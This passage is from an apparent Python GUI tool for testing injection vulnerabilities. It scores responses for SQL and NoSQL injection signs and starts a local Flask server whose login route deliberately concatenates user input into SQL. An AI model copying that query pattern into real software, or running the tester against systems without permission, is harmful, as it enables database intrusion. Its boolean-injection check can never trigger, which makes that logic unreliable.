            if re.search(pattern, response.text, re.IGNORECASE):
                return f"Error pattern found: {pattern}"

        if ("SLEEP" in payload.upper() or "DELAY" in payload.upper() or "pg_sleep" in payload) and response_time > 2:
            return f"Time-based injection likely (delay: {response_time:.2f}s)"

        if "UNION SELECT" in payload.upper():
            cols = re.findall(r'\b\d+\b', payload)
            for col in cols:
                if col in response.text:
                    return f"UNION injection likely (column value found: {col})"

        if ("AND 1=1" in payload or "OR 1=1" in payload) and response.status_code == 200:
            if "AND 1=2" in payload or "OR 1=2" in payload:
                if response.status_code != 200:
                    return "Boolean-based injection likely (different responses for true/false conditions)"

        if "$ne" in payload or "$gt" in payload or "$where" in payload:
            if response.status_code == 200:
                return "Possible NoSQL injection (successful request with NoSQL operators)"

        return None

    def add_result(self, result):
        self.results.append(result)
        self.results_text.config(state=tk.NORMAL)
        if "[VULNERABLE]" in result:
            self.results_text.insert(tk.END, result + "\n\n", "vulnerable")
        elif "[POSSIBLE VULNERABLE]" in result:
            self.results_text.insert(tk.END, result + "\n\n", "possible")
        else:
            self.results_text.insert(tk.END, result + "\n\n")
        self.results_text.see(tk.END)
        self.results_text.config(state=tk.DISABLED)

    def clear_results(self):
        self.results = []
        self.results_text.config(state=tk.NORMAL)
        self.results_text.delete(1.0, tk.END)
        self.results_text.config(state=tk.DISABLED)

    def save_results(self):
        if not self.results:
            messagebox.showinfo("Info", "No results to save")
            return

        try:
            filename = tk.filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )

            if not filename:
                return

            with open(filename, "w") as f:
                f.write("Database Injection Test Results\n")
                f.write("=============================\n\n")
                f.write(f"Target: {self.target_url.get()}\n")
                f.write(f"Parameter tested: {self.target_param.get()}\n")
                f.write(f"Test date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

                for result in self.results:
                    f.write(result + "\n\n")

            messagebox.showinfo("Success", f"Results saved to {filename}")

        except Exception as e:
            messagebox.showerror("Error", f"Failed to save results: {str(e)}")

class DatabaseSimulator:
    def __init__(self):
        self.setup_sqlite()

    def setup_sqlite(self):
        self.conn = sqlite3.connect(':memory:')
        cursor = self.conn.cursor()
        cursor.execute('''
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            email TEXT
        )
        ''')
        sample_users = [
            (1, 'admin', 'admin123', 'admin@example.com'),
            (2, 'user1', 'password1', 'user1@example.com'),
            (3, 'user2', 'password2', 'user2@example.com')
        ]
        cursor.executemany('INSERT INTO users VALUES (?, ?, ?, ?)', sample_users)
        self.conn.commit()

    def query(self, sql):
        try:
            cursor = self.conn.cursor()
            cursor.execute(sql)
            return cursor.fetchall()
        except sqlite3.Error as e:
            return f"SQL Error: {str(e)}"

def start_simulation_server():
    app = Flask(__name__)
    db = sqlite3.connect(':memory:')
    cursor = db.cursor()
    cursor.execute('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
    cursor.execute("INSERT INTO users VALUES (1, 'admin', 'admin123')")
    db.commit()

    @app.route('/login')
    def login():
        username = request.args.get('username', '')
        query = f"SELECT * FROM users WHERE username = '{username}'"
        try:
            cursor.execute(query)
            result = cursor.fetchall()
            return jsonify({"status": "success", "data": result})
        except sqlite3.Error as e:
            return jsonify({"status": "error", "message": str(e)})

    threading.Thread(target=lambda: app.run(debug=False, port=5000), daemon=True).start()

def main():
    start_simulation_server()
    root = tk.Tk()
    app = DBInjectionTester(root)
    root.mainloop()

if __name__ == "__main__":
    main()
